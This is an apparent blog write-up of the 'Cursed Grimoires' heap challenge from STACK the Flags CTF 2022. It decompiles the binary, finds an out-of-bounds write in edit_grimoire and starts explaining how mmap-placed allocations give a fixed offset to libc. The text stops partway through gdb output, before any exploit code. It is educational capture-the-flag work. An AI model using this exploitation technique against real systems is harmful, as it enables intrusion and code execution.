<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>STACK the Flags CTF 2022 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:url" content="https://chovid99.github.io/posts/stack-the-flags-ctf-2022/">
  <meta property="og:site_name" content="Chovid99&#39;s Blog">
  <meta property="og:title" content="STACK the Flags CTF 2022">
  <meta property="og:description" content="Writeup for STACK the Flags CTF 2022 by Chovid99">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-12-05T16:11:43+07:00">
    <meta property="article:modified_time" content="2023-02-23T18:03:33+07:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="STACK the Flags">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Heap">
    <meta property="article:tag" content="Education">
    <meta property="article:tag" content="FILE">
    <meta property="og:image" content="https://chovid99.github.io/C99-web-card.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png">
  <meta name="twitter:title" content="STACK the Flags CTF 2022">
  <meta name="twitter:description" content="Writeup for STACK the Flags CTF 2022 by Chovid99">
      <meta name="twitter:site" content="@Chovid99">
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/stack-the-flags-ctf-2022/" /><link rel="prev" href="https://chovid99.github.io/posts/hitcon-ctf-2022/" /><link rel="next" href="https://chovid99.github.io/posts/hacktm-ctf-2023/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "STACK the Flags CTF 2022",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/stack-the-flags-ctf-2022\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, STACK the Flags, pwn, heap, Education, FILE","wordcount":  6108 ,
        "url": "https:\/\/chovid99.github.io\/posts\/stack-the-flags-ctf-2022\/","datePublished": "2022-12-05T16:11:43+07:00","dateModified": "2023-02-23T18:03:33+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">STACK the Flags CTF 2022</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Dec 05, 2022">Dec 05, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6108 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;29 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cursed-grimoires">Cursed Grimoires</a>
      <ul>
        <li><a href="#initial-analysis">Initial Analysis</a>
          <ul>
            <li><a href="#main">main</a></li>
            <li><a href="#menu">menu</a></li>
            <li><a href="#create_grimoire">create_grimoire</a></li>
            <li><a href="#edit_grimoire">edit_grimoire</a></li>
          </ul>
        </li>
        <li><a href="#exploitation">Exploitation</a>
          <ul>
            <li><a href="#leveraging-the-oob-bug-with-malloc-behavior">Leveraging the OOB bug with <code>malloc</code> behavior</a></li>
            <li><a href="#getting-a-libc-leak">Getting a libc leak</a></li>
            <li><a href="#gaining-remote-code-execution-rce">Gaining Remote Code Execution (RCE)</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/JqbSKOa.png" title="https://i.imgur.com/JqbSKOa.png" data-thumbnail="https://i.imgur.com/JqbSKOa.png" data-sub-html="<h2>We got 2nd place!</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/JqbSKOa.png"
            data-srcset="https://i.imgur.com/JqbSKOa.png, https://i.imgur.com/JqbSKOa.png 1.5x, https://i.imgur.com/JqbSKOa.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/JqbSKOa.png" />
    </a><figcaption class="image-caption">We got 2nd place!</figcaption>
    </figure>
<p>Last weekend, I spent my time competing at STACK the Flags CTF 2022 held by GovTech SG with team <code>PDKT then sad</code>. We got 2nd place in the Open Category. Thanks a lot to GovTech SG for the amazing CTF!</p>
<p>On this CTF, I managed to solve all of the <code>pwn</code> challenges, and today, I will make a writeup on one of the challenges called <code>Cursed Grimoires</code>, because my solution for that challenge is related to the FILE Structure Attack on the recent GLIBC 2.35 (I&rsquo;ve made a promise before to continue my FILE Structure Attack series, so I try to make this writeup as detailed as possible during explaining the FILE Structure part).</p>
<p>I recommend you to read my first article about FILE Structure Attack in <a href="https://chovid99.github.io/posts/file-structure-attack-part-1/" target="_blank" rel="noopener noreffer ">here</a> to get a basic understanding of how FILE Structure Attack works. You can say that this post is like the second part of that article, but focusing only in the glibc 2.35.</p>
<h1 id="cursed-grimoires">Cursed Grimoires</h1>
<h2 id="initial-analysis">Initial Analysis</h2>
<p>We were given a zip file containing the challenge binary called <code>cursed_grimoires</code> and the libc file that is being used to run the binary. Let&rsquo;s start the analysis by checking the properties of the binary via <code>checksec</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─❯ checksec cursed_grimoires
</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
</span></span><span class="line"><span class="cl">    Stack:    Canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see, the binary:</p>
<ul>
<li>Full RELRO: It means we can&rsquo;t modify the GOT table.</li>
<li>Canary found: It means the binary tries to protect against buffer overflow by storing a canary value in the stack (Which will throw an error if we do buffer overflow and overwrite it with an incorrect value).</li>
<li>NX enabled: It means the stack area isn&rsquo;t executable (We can&rsquo;t jump to the address in the stack area).</li>
<li>PIE enabled: It means the address of the binary&rsquo;s functions itself will be randomized on each execution.</li>
</ul>
<p>Now, let&rsquo;s check the libc version</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─❯ ./libc.so.6
</span></span><span class="line"><span class="cl">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, the binary used glibc 2.35, which is quite hard to be exploited.</p>
<p>Now that we have known the properties, seems like the mitigation are quite strong. Let&rsquo;s continue our analysis by disassembling the binary methods one by one.</p>
<h3 id="main">main</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setup_IO</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">menu</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Enter choice =&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">create_grimoire</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">edit_grimoire</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>From the main function, it will call <code>menu()</code> on each iteration, and we can see that there are three menus that we can select based on our choice&rsquo;s input, <code>create_grimoire</code>, <code>edit_grimoire</code>, and <code>exit</code>. Let&rsquo;s continue our analysis by disassembling those methods.</p>
<h3 id="menu">menu</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">menu</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1B</span><span class="s">[2J</span><span class="se">\x1B</span><span class="s">[H&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1. Create Grimoire (Only once)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;2. Edit Grimoire&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;3. Finish Grimoire&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v1</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, this method just prints the available menus and the number that we should input to choose one of the available menus.</p>
<h3 id="create_grimoire">create_grimoire</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">create_grimoire</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1B</span><span class="s">[2J</span><span class="se">\x1B</span><span class="s">[H&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">GRIMOIRE</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Size of grimoire =&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">size</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%zu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="nf">getchar</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">GRIMOIRE</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Write your contents =&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">GRIMOIRE</span><span class="p">,</span> <span class="n">size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>From the disassemble&rsquo;s result, we can see that the <code>create_grimoire</code> method will do three sequential operations:</p>
<ul>
<li>Check whether the global variable <code>GRIMOIRE</code> is null or not. This means that we can call <code>create_grimoire</code> only one time per execution.</li>
<li>Ask for the size of the grimoire, and then it will call <code>malloc</code> to create a new chunk with the input size.</li>
<li>Ask for the content of the newly created chunk.</li>
</ul>
<p>One thing that we can notice in this method is that we can set a big size for the chunk that we want to create because there isn&rsquo;t any restriction. Keep this in mind first because this will be useful later. Let&rsquo;s move to the <code>edit_grimoire</code> method.</p>
<h3 id="edit_grimoire">edit_grimoire</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">edit_grimoire</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+3h] [rbp-Dh]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1B</span><span class="s">[2J</span><span class="se">\x1B</span><span class="s">[H&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">GRIMOIRE</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index to edit =&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="nf">getchar</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Replacement =&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v1</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="nf">getchar</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">GRIMOIRE</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v3</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>At a glance, we can see that this method will allow us to edit the content of the newly allocated chunk. It will only allow us to edit one char per call (Give the index, and then it will replace the stored value in the given index with the new value that you just gave).</p>
<p>If we read this function method carefully, notice that there is a bug in this method. There isn&rsquo;t any check whether the index that we give is a valid index or not (valid means the index is still inside the allocated chunk&rsquo;s area). This means that we can do Out-Of-Bounds write on any address that we like, relative to the chunks.</p>
<p>To summarize, some important notes that we have taken from our analysis:</p>
<ul>
<li>There are three menus that we can choose (<code>create</code>, <code>edit</code>, and <code>exit</code>).</li>
<li>We can allocate one chunk with any size that we want.</li>
<li>There is a bug in the <code>edit</code> method which leads us to OOB write on any address that we want (relative to our allocated chunk&rsquo;s address)</li>
</ul>
<h2 id="exploitation">Exploitation</h2>
<p>Now, based on those important notes, we need to think about how to abuse the OOB bug that we found so that we can leverage it into Remote-Code-Execution (RCE). Up until now:</p>
<ul>
<li>Even though we have an OOB write, due to ASLR (address randomization), we don&rsquo;t know the exact address of our created chunk in the heap nor the offset difference between our targeted address with our chunk.</li>
</ul>
<h3 id="leveraging-the-oob-bug-with-malloc-behavior">Leveraging the OOB bug with <code>malloc</code> behavior</h3>
<p>So, what should we do? Remember that in this binary, we are allowed to allocate a chunk of any size. Let&rsquo;s check the manuals of the malloc. Turns out, there are some interesting notes in the <code>man malloc</code> result.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">NOTES
</span></span><span class="line"><span class="cl">       By default, Linux follows an optimistic memory allocation strategy.  This means that when malloc() returns non-NULL there is no guarantee that the memory really is available.  In  case  it
</span></span><span class="line"><span class="cl">       turns  out  that  the  system  is  out  of  memory, one or more processes will be killed by the OOM killer.  For more information, see the description of /proc/sys/vm/overcommit_memory and
</span></span><span class="line"><span class="cl">       /proc/sys/vm/oom_adj in proc(5), and the Linux kernel source file Documentation/vm/overcommit-accounting.rst.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       Normally, malloc() allocates memory from the heap, and adjusts the size of the heap as required, using sbrk(2).  When allocating blocks of memory  larger  than  MMAP_THRESHOLD  bytes,  the
</span></span><span class="line"><span class="cl">       glibc  malloc()  implementation allocates the memory as a private anonymous mapping using mmap(2).
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on the notes, if we call <code>malloc()</code> with a big size, it will place our chunk in the mmapped page rather than the heap area. And reading through this <a href="https://github.com/LMS57/Nightmare-Writeup" target="_blank" rel="noopener noreffer ">article</a> that I found, we can learn that a new page created by <code>mmap</code> will have a consistent offset difference from the libc starting area address. To prove this, let&rsquo;s fire up our <code>gdb</code> to run the binary multiple time and test it by allocating a chunk with size <code>1000000</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef➤  x/gx &amp;GRIMOIRE
</span></span><span class="line"><span class="cl">0x55e0067dd030 &lt;GRIMOIRE&gt;:      0x00007f3b78939010
</span></span><span class="line"><span class="cl">gef➤  vmmap
</span></span><span class="line"><span class="cl">[ Legend:  Code | Heap | Stack ]
</span></span><span class="line"><span class="cl">Start              End                Offset             Perm Path
</span></span><span class="line"><span class="cl">0x000055e0067d9000 0x000055e0067da000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span class="line"><span class="cl">0x000055e0067da000 0x000055e0067db000 0x0000000000001000 r-x /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span class="line"><span class="cl">0x000055e0067db000 0x000055e0067dc000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span class="line"><span class="cl">0x000055e0067dc000 0x000055e0067dd000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
